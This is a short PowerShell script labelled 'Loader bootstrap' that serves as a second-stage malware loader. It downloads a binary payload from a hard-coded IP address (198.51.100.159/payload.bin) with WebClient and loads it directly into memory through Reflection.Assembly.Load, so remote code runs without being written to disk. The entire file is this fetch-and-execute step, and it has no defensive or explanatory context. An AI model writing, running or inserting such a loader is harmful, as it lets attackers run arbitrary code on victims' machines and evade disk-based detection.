
<# Loader bootstrap #>
[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://198.51.100.159/payload.bin'
)
$ManagedBytes = (New-Object System.Net.WebClient).DownloadData($Stage2Url)
[Reflection.Assembly]::Load($ManagedBytes)
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
